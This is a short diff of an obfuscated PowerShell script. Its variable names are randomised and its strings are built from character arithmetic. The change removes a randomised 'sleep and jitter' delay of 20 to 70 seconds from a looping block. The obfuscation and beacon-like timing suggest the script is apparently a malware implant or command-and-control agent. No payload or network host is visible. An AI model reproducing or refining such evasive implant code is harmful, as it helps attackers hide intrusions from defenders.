@@ -17,10 +17,6 @@ $LgNzzmiE69o = ([char](14 + 6 + 47) + [char](7 + 14 + 87) + [char](25 + 27 + 59)
 $yKVHzpzreR = ([char](1 + 66) + [char](147 - 39) + [char](49 + 62) + [char](148 - 33) + [char](113 - 12))
 $kQiJjQYQoKLQm = ([char](6 + 4 + 57) + [char](208 - 50 - 50) + [char](6 + 48 + 57) + [char](28 + 24 + 63) + [char](201 - 50 - 50))
 
-# Sleep & Jitter Configuration (20-70 detik)
-$HzQWNyUSx1tJ = 20000
-$rcuWDkgjAXhSo = 70000
-$FKBz26CA5c = & $WgNbBYBVWmP $P2JPaMbCga4mreA
 
 if ((-not $LcqhsQkhgAi) -or (-not $ouMULHhaPzqRlAV) -or (-not $iGtszSEsUJr)) {
     exit
@@ -73,8 +69,7 @@ try {
         }
 
         
-        $kWudamCerY = $FKBz26CA5c.Next($HzQWNyUSx1tJ, $rcuWDkgjAXhSo)
-        & $vkygTJziITxV -Milliseconds $kWudamCerY
+
     }
 
 } catch {
